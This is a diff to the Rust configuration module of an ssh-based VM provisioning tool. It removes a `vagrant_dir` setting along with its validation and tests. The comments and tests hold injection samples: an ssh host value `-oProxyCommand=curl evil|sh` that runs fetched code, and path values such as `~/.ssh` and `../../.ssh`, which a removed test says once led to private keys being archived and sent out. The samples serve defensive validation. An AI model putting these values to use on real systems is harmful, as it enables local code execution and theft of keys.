@@ -95,10 +95,6 @@ use read::{
 };
 pub(crate) use root::path_segments;
 
-/// Default directory (relative to the project root) holding
-/// the Vagrantfile and provisioning scripts.
-const DEFAULT_VAGRANT_DIR: &str = "vagrant";
-
 /// Default root on the VM host under which project
 /// directories are created.
 const DEFAULT_REMOTE_ROOT: &str = "~/vms";
@@ -125,9 +121,6 @@ pub struct Config {
     /// Project name. Doubles as the directory name on the
     /// VM host.
     pub project: String,
-
-    /// Directory in the project repo holding the Vagrantfile.
-    pub vagrant_dir: String,
 
     /// Root directory on the VM host under which project
     /// directories are created.
@@ -158,19 +151,12 @@ struct ProjectFile {
 
     project: String,
 
-    #[serde(default = "default_vagrant_dir")]
-    vagrant_dir: String,
-
     #[serde(default = "default_remote_root")]
     remote_root: String,
 
     vm: Vm,
 
     source: Source,
-}
-
-fn default_vagrant_dir() -> String {
-    DEFAULT_VAGRANT_DIR.to_owned()
 }
 
 fn default_remote_root() -> String {
@@ -203,8 +189,6 @@ pub struct Overlay {
     pub host: Option<String>,
     /// Replaces [`Config::project`].
     pub project: Option<String>,
-    /// Replaces [`Config::vagrant_dir`].
-    pub vagrant_dir: Option<String>,
     /// Replaces [`Config::remote_root`].
     pub remote_root: Option<String>,
     /// Replaces [`Config::vm`] wholesale.
@@ -233,7 +217,6 @@ impl ProjectFile {
         let cfg = Config {
             host,
             project: self.project,
-            vagrant_dir: self.vagrant_dir,
             remote_root: self.remote_root,
             vm: self.vm,
             source: self.source,
@@ -288,14 +271,12 @@ impl Config {
         let Overlay {
             host: _,
             project,
-            vagrant_dir,
             remote_root,
             vm,
             source,
         } = overlay;
 
         replace(&mut self.project, project);
-        replace(&mut self.vagrant_dir, vagrant_dir);
         replace(&mut self.remote_root, remote_root);
         replace(&mut self.vm, vm);
         replace(&mut self.source, source);
@@ -457,9 +438,9 @@ impl Config {
     /// shape.
     ///
     /// The `host` rules matter most. `host` is passed as the
-    /// first positional argument to `ssh` and `scp`, and
-    /// neither program honours a `--` end-of-options
-    /// separator. A value starting with `-` is therefore read
+    /// first positional argument to `ssh`, which does not
+    /// honour a `--` end-of-options separator. A value starting
+    /// with `-` is therefore read
     /// as an *option*, so `-oProxyCommand=curl evil|sh` runs
     /// code on this workstation from a bare `bombyx status`,
     /// before any network traffic.
@@ -490,29 +471,21 @@ impl Config {
 
         // Each field specifies the program it will reach.
         //
-        // `project` and `vagrant_dir` are checked here;
-        // `remote_root` gets the same two rules inside
-        // `root::check` below, along with its own four.
+        // `project` is checked here; `remote_root` gets the same
+        // two rules inside `root::check` below, along with its
+        // own four.
         //
-        // **For these three the rule is a precaution, not a live
-        // hole.** Only `host` is handed to a program as a bare
-        // argument that a leading `-` could turn into an option.
-        // `project` and `remote_root` go through
-        // `quote_remote_path` into a shell script that `ssh`
-        // runs, so they arrive quoted; `vagrant_dir` is joined
-        // onto the current directory before it reaches `tar -C`,
-        // and a join puts a directory in front of the dash. The
-        // rule is kept anyway, because each of those three
+        // **For both the rule is a precaution, not a live hole.**
+        // Only `host` is handed to a program as a bare argument
+        // that a leading `-` could turn into an option. `project`
+        // and `remote_root` go through `quote_remote_path` into a
+        // shell script that `ssh` runs, so they arrive quoted.
+        // The rule is kept anyway, because each of those
         // protections lives in a different file from the value,
-        // and any of them could be rewritten by somebody who
-        // does not know it was load-bearing.
-        for (field, value, tool) in [
-            ("project", &self.project, "ssh"),
-            ("vagrant_dir", &self.vagrant_dir, "tar"),
-        ] {
-            guards::check_not_empty(field, value)?;
-            guards::check_not_an_option(field, value, tool)?;
-        }
+        // and either could be rewritten by somebody who does not
+        // know it was load-bearing.
+        guards::check_not_empty("project", &self.project)?;
+        guards::check_not_an_option("project", &self.project, "ssh")?;
         guards::check_not_empty("remote_root", &self.remote_root)?;
 
         // `project` becomes one directory name on the host.
@@ -521,25 +494,10 @@ impl Config {
             reason: e.to_string(),
         })?;
 
-        // `vagrant_dir` is the one field that names a path on
-        // *this* machine, so it is the one that can point the
-        // archive at something outside the project.
-        guards::check_project_relative("vagrant_dir", &self.vagrant_dir)?;
-
         // Every `remote_root` rule lives in `config::root`,
         // because bombyx deletes the directory it derives from
         // that value. See the module for what each rule stops.
         root::check(&self.remote_root)?;
-
-        // `vagrant_dir` is a local path, so it must tolerate
-        // Windows spellings (`infra\vm`, `C:\...`). Only
-        // control characters are refused.
-        if self.vagrant_dir.chars().any(char::is_control) {
-            return Err(ConfigError::Invalid {
-                field: "vagrant_dir",
-                reason: "must not contain control characters".to_owned(),
-            });
-        }
 
         self.validate_generated()
     }
@@ -705,66 +663,15 @@ mod tests {
         let cfg = good();
         assert_eq!(cfg.host, "vmhost");
         assert_eq!(cfg.project, "myproject");
-        assert_eq!(cfg.vagrant_dir, "vagrant");
         assert_eq!(cfg.remote_root, "~/vms");
     }
 
     #[test]
     fn parses_explicit_overrides() {
         let src = "project = \"ledgerstone\"\n\
-                   vagrant_dir = \"infra/vm\"\n\
                    remote_root = \"/srv/vms\"\n";
         let cfg = parse(src).unwrap();
-        assert_eq!(cfg.vagrant_dir, "infra/vm");
         assert_eq!(cfg.remote_root, "/srv/vms");
-    }
-
-    #[test]
-    fn rejects_a_vagrant_dir_that_escapes_the_project() {
-        // `vagrant_dir` is joined onto the working directory,
-        // and `Path::join` with an absolute operand *discards*
-        // the left side -- so an absolute value makes `up`
-        // archive that directory instead of the project's.
-        // A repo shipping one of these had `bombyx up` tar the
-        // operator's private keys and scp them to the host
-        // named in the same file.
-        //
-        // The whole family, not just the case that prompted
-        // the guard: two rooted spellings, a Windows drive
-        // (which is *not* absolute on Unix, and the config
-        // travels between platforms), a home reference, and
-        // traversal in either position.
-        for bad in [
-            "/etc",
-            "\\Windows",
-            "C:/Users/igor/.ssh",
-            "c:\\Users\\igor\\.ssh",
-            "~/.ssh",
-            "../../.ssh",
-            "vagrant/../../.ssh",
-            "./vagrant",
-        ] {
-            let src = format!("project = \"p\"\nvagrant_dir = {bad:?}\n");
-            let err = parse(&src).unwrap_err();
-            assert!(
-                matches!(
-                    err,
-                    ConfigError::Invalid {
-                        field: "vagrant_dir",
-                        ..
-                    }
-                ),
-                "{bad} must be rejected, got {err:?}"
-            );
-        }
-    }
-
-    #[test]
-    fn accepts_a_relative_vagrant_dir() {
-        for good in ["vagrant", "infra/vm", "a/b/c"] {
-            let src = format!("project = \"p\"\nvagrant_dir = {good:?}\n");
-            assert_eq!(parse(&src).unwrap().vagrant_dir, good);
-        }
     }
 
     #[test]
@@ -795,7 +702,6 @@ mod tests {
         let cfg = good().with_overlay(overlay);
         assert_eq!(cfg.project, "other");
         assert_eq!(cfg.host, "vmhost");
-        assert_eq!(cfg.vagrant_dir, "vagrant");
         assert_eq!(cfg.remote_root, "~/vms");
     }
 
@@ -844,10 +750,9 @@ mod tests {
         // `Overlay` but the two are never actually wired
         // together.
         let src = "project = \"p\"\n\
-                   vagrant_dir = \"vm\"\nremote_root = \"/srv/v\"\n";
+                   remote_root = \"/srv/v\"\n";
         let cfg = good().with_overlay(toml::from_str(src).unwrap());
         assert_eq!(cfg.project, "p");
-        assert_eq!(cfg.vagrant_dir, "vm");
         assert_eq!(cfg.remote_root, "/srv/v");
     }
 
@@ -1313,7 +1218,7 @@ mod tests {
     #[test]
     fn an_overlay_cannot_smuggle_an_ssh_option() {
         // `host` reaches `ssh` as its first positional
-        // argument, and neither ssh nor scp honours `--`, so a
+        // argument, and `ssh` does not honour `--`, so a
         // leading `-` is read as an option. The overlay must not
         // be the one source that skips that check.
         let (_dir, loaded) = load_with_overlay("host = \"-oProxyCommand=x\"");
@@ -1321,21 +1226,6 @@ mod tests {
         assert!(matches!(err, ConfigError::InvalidHost { .. }), "{err}");
         // And the message identifies the file holding the value.
         assert!(err.to_string().contains("bombyx.local.toml"), "{err}");
-    }
-
-    #[test]
-    fn an_overlay_cannot_smuggle_an_escaping_vagrant_dir() {
-        // The other half of the same rule, and the one with the
-        // worse outcome: an absolute `vagrant_dir` makes `up`
-        // archive that directory instead of the project's.
-        let (_dir, loaded) = load_with_overlay("vagrant_dir = \"/etc\"");
-        assert!(matches!(
-            loaded.unwrap_err(),
-            ConfigError::Invalid {
-                field: "vagrant_dir",
-                ..
-            }
-        ));
     }
 
     #[test]
@@ -1408,7 +1298,7 @@ mod tests {
 
     #[test]
     fn rejects_missing_required_field() {
-        let err = parse("vagrant_dir = \"vm\"\n").unwrap_err();
+        let err = parse("remote_root = \"/srv/v\"\n").unwrap_err();
         assert!(matches!(err, ConfigError::Parse { .. }));
     }
 
@@ -1437,18 +1327,6 @@ mod tests {
         let src = "project = \"  \"\n";
         let err = parse(src).unwrap_err();
         assert!(matches!(err, ConfigError::Empty { field: "project" }));
-    }
-
-    #[test]
-    fn rejects_empty_vagrant_dir() {
-        let src = "project = \"p\"\nvagrant_dir = \"\"\n";
-        let err = parse(src).unwrap_err();
-        assert!(matches!(
-            err,
-            ConfigError::Empty {
-                field: "vagrant_dir"
-            }
-        ));
     }
 
     #[test]
@@ -1494,35 +1372,6 @@ mod tests {
                 ..
             }
         ));
-    }
-
-    #[test]
-    fn rejects_a_vagrant_dir_that_looks_like_a_flag() {
-        let src = "project = \"p\"\n\
-                   vagrant_dir = \"--exclude=x\"\n";
-        let err = parse(src).unwrap_err();
-        assert!(matches!(
-            err,
-            ConfigError::Invalid {
-                field: "vagrant_dir",
-                ..
-            }
-        ));
-    }
-
-    #[test]
-    fn rejects_a_vagrant_dir_with_control_characters() {
-        let src = "project = \"p\"\n\
-                   vagrant_dir = \"a\\nb\"\n";
-        let err = parse(src).unwrap_err();
-        assert!(err.to_string().contains("control characters"));
-    }
-
-    #[test]
-    fn accepts_a_windows_vagrant_dir() {
-        let src = "project = \"p\"\n\
-                   vagrant_dir = 'infra\\vm'\n";
-        assert_eq!(parse(src).unwrap().vagrant_dir, r"infra\vm");
     }
 
     #[test]
